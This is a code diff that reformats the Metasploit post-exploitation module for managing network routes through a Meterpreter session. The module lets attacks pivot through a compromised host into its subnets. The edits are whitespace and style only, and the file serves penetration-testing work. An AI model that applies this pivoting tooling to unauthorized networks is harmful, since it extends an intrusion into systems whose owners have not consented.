@@ -5,32 +5,37 @@
 
 class MetasploitModule < Msf::Post
 
-  def initialize(info={})
-    super( update_info( info,
-        'Name'          => 'Multi Manage Network Route via Meterpreter Session',
-        'Description'   => %q{This module manages session routing via an existing
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Multi Manage Network Route via Meterpreter Session',
+        'Description' => %q{
+          This module manages session routing via an existing
           Meterpreter session. It enables other modules to 'pivot' through a
           compromised host when connecting to the named NETWORK and SUBMASK.
           Autoadd will search a session for valid subnets from the routing table
           and interface list then add routes to them. Default will add a default
           route so that all TCP/IP traffic not specified in the MSF routing table
           will be routed through the session when pivoting. See documentation for more
-          'info -d' and click 'Knowledge Base'},
-        'License'       => MSF_LICENSE,
-        'Author'        =>
-           [
-             'todb',
-             'Josh Hale "sn0wfa11" <jhale85446[at]gmail.com>'
-           ],
-        'SessionTypes'  => [ 'meterpreter']
-      ))
+          'info -d' and click 'Knowledge Base'
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
+          'todb',
+          'Josh Hale "sn0wfa11" <jhale85446[at]gmail.com>'
+        ],
+        'SessionTypes' => [ 'meterpreter']
+      )
+    )
 
     register_options(
       [
         OptString.new('SUBNET', [false, 'Subnet (IPv4, for example, 10.10.10.0)', nil]),
         OptString.new('NETMASK', [false, 'Netmask (IPv4 as "255.255.255.0" or CIDR as "/24"', '255.255.255.0']),
-        OptEnum.new('CMD', [true, 'Specify the autoroute command', 'autoadd', ['add','autoadd','print','delete','default']])
-      ])
+        OptEnum.new('CMD', [true, 'Specify the autoroute command', 'autoadd', ['add', 'autoadd', 'print', 'delete', 'default']])
+      ]
+    )
   end
 
   # Get the CMD string vs ACTION
@@ -65,8 +70,8 @@ class MetasploitModule < Msf::Post
     when :print
       print_routes()
     when :add
-      if validate_cmd(datastore['SUBNET'],netmask)
-        print_status("Adding a route to %s/%s..." % [datastore['SUBNET'],netmask])
+      if validate_cmd(datastore['SUBNET'], netmask)
+        print_status("Adding a route to %s/%s..." % [datastore['SUBNET'], netmask])
         add_route(datastore['SUBNET'], netmask)
       end
     when :autoadd
@@ -75,7 +80,7 @@ class MetasploitModule < Msf::Post
       add_default
     when :delete
       if datastore['SUBNET']
-        print_status("Deleting route to %s/%s..." % [datastore['SUBNET'],netmask])
+        print_status("Deleting route to %s/%s..." % [datastore['SUBNET'], netmask])
         delete_route(datastore['SUBNET'], netmask)
       else
         delete_all_routes()
@@ -118,8 +123,8 @@ class MetasploitModule < Msf::Post
     # IPv4 Table
     tbl_ipv4 = Msf::Ui::Console::Table.new(
       Msf::Ui::Console::Table::Style::Default,
-      'Header'  => "IPv4 Active Routing Table",
-      'Prefix'  => "\n",
+      'Header' => "IPv4 Active Routing Table",
+      'Prefix' => "\n",
       'Postfix' => "\n",
       'Columns' =>
         [
@@ -129,15 +134,16 @@ class MetasploitModule < Msf::Post
         ],
       'ColProps' =>
         {
-          'Subnet'  => { 'MaxWidth' => 17 },
+          'Subnet' => { 'MaxWidth' => 17 },
           'Netmask' => { 'MaxWidth' => 17 },
-        })
+        }
+    )
 
     # IPv6 Table
     tbl_ipv6 = Msf::Ui::Console::Table.new(
       Msf::Ui::Console::Table::Style::Default,
-      'Header'  => "IPv6 Active Routing Table",
-      'Prefix'  => "\n",
+      'Header' => "IPv6 Active Routing Table",
+      'Prefix' => "\n",
       'Postfix' => "\n",
       'Columns' =>
         [
@@ -147,9 +153,10 @@ class MetasploitModule < Msf::Post
         ],
       'ColProps' =>
         {
-          'Subnet'  => { 'MaxWidth' => 17 },
+          'Subnet' => { 'MaxWidth' => 17 },
           'Netmask' => { 'MaxWidth' => 17 },
-        })
+        }
+    )
 
     # Populate Route Tables
     Rex::Socket::SwitchBoard.each { |route|
@@ -181,8 +188,9 @@ class MetasploitModule < Msf::Post
   # function that can just do this.
   #
   # @return [string class] IPv4 subnet
-  def check_ip(ip=nil)
-    return false if(ip.nil? || ip.strip.empty?)
+  def check_ip(ip = nil)
+    return false if (ip.nil? || ip.strip.empty?)
+
     begin
       rw = Rex::Socket::RangeWalker.new(ip.strip)
       (rw.valid? && rw.length == 1) ? true : false
@@ -195,7 +203,7 @@ class MetasploitModule < Msf::Post
   #
   # @return [string class] IPv4 netmask
   def cidr_to_netmask(cidr)
-    int = cidr.gsub(/\x2f/,"").to_i
+    int = cidr.gsub(/\x2f/, "").to_i
     Rex::Socket.addr_ctoa(int)
   end
 
@@ -221,12 +229,12 @@ class MetasploitModule < Msf::Post
   #
   # @return [true]  If added
   # @return [false] If not
-  def add_route(subnet, netmask, origin=nil)
-  if origin
-    origin = " from #{origin}"
-  else
-    origin = ""
-  end
+  def add_route(subnet, netmask, origin = nil)
+    if origin
+      origin = " from #{origin}"
+    else
+      origin = ""
+    end
 
     begin
       if Rex::Socket::SwitchBoard.add_route(subnet, netmask, session)
@@ -286,12 +294,14 @@ class MetasploitModule < Msf::Post
   # @return [void] A useful return value is not expected here
   def autoadd_routes
     return unless route_compatible?
+
     print_status("Searching for subnets to autoroute.")
     found = false
 
     begin
-      session.net.config.each_route do | route |
+      session.net.config.each_route do |route|
         next unless (Rex::Socket.is_ipv4?(route.subnet) && Rex::Socket.is_ipv4?(route.netmask)) # Pick out the IPv4 addresses
+
         subnet = get_subnet(route.subnet, route.netmask) # Make sure that the subnet is actually a subnet and not an IP address. Android phones like to send over their IP.
         next unless is_routable?(subnet, route.netmask)
 
@@ -299,12 +309,11 @@ class MetasploitModule < Msf::Post
           found = true if add_route(subnet, route.netmask, "host's routing table")
         end
       end
-
     rescue ::Rex::Post::Meterpreter::RequestError => re
       print_status("Unable to get routes from session, trying interface list.")
     end
 
-    if !autoadd_interface_routes && !found  # Check interface list for more possible routes
+    if !autoadd_interface_routes && !found # Check interface list for more possible routes
       print_status("Did not find any new subnets to add.")
     end
   end
@@ -316,13 +325,12 @@ class MetasploitModule < Msf::Post
   # @return [false] No additional routes were added
   def autoadd_interface_routes
     return unless interface_compatible?
+
     found = false
 
     begin
-      session.net.config.each_interface do | interface | # Step through each of the network interfaces
-
-        (0..(interface.addrs.size - 1)).each do | index | # Step through the addresses for the interface
-
+      session.net.config.each_interface do |interface| # Step through each of the network interfaces
+        (0..(interface.addrs.size - 1)).each do |index| # Step through the addresses for the interface
           ip_addr = interface.addrs[index]
           netmask = interface.netmasks[index]
 
@@ -336,7 +344,6 @@ class MetasploitModule < Msf::Post
               found = true if add_route(subnet, netmask, interface.mac_name)
             end
           end
-
         end
       end
     rescue ::Rex::Post::Meterpreter::RequestError => error
@@ -353,15 +360,16 @@ class MetasploitModule < Msf::Post
   # @return [string class] The subnet related to the IP address and netmask
   # @return [nil class] Something is out of range
   def get_subnet(ip_addr, netmask)
-    return nil if !validate_cmd(ip_addr, netmask) #make sure IP and netmask are valid
+    return nil if !validate_cmd(ip_addr, netmask) # make sure IP and netmask are valid
 
     nets = ip_addr.split('.')
     masks = netmask.split('.')
     output = ""
 
-    (0..3).each do | index |
+    (0..3).each do |index|
       octet = get_subnet_octet(int_or_nil(nets[index]), int_or_nil(masks[index]))
       return nil if !octet
+
       output << octet.to_s
       output << '.' if index < 3
     end
@@ -434,7 +442,7 @@ class MetasploitModule < Msf::Post
   # @return [false class] Session does not
   def route_compatible?
     session.respond_to?(:net) &&
-    session.net.config.respond_to?(:each_route)
+      session.net.config.respond_to?(:each_route)
   end
 
   # Checks to see if the session has capabilities of accessing network interfaces
@@ -443,30 +451,30 @@ class MetasploitModule < Msf::Post
   # @return [false class] Session does not
   def interface_compatible?
     session.respond_to?(:net) &&
-    session.net.config.respond_to?(:each_interface)
+      session.net.config.respond_to?(:each_interface)
   end
 
   # Validates the command options
   #
   # @return [true class] Everything is good
   # @return [false class] Not so much
-  def validate_cmd(subnet=nil,netmask=nil)
+  def validate_cmd(subnet = nil, netmask = nil)
     if subnet.nil?
       print_error "Missing subnet option"
       return false
     end
 
-    unless(check_ip(subnet))
+    unless (check_ip(subnet))
       print_error "Subnet invalid (must be IPv4)"
       return false
     end
 
-    if(netmask and !(Rex::Socket.addr_atoc(netmask)))
+    if (netmask and !(Rex::Socket.addr_atoc(netmask)))
       print_error "Netmask invalid (must define contiguous IP addressing)"
       return false
     end
 
-    if(netmask and !check_ip(netmask))
+    if (netmask and !check_ip(netmask))
       print_error "Netmask invalid"
       return false
     end
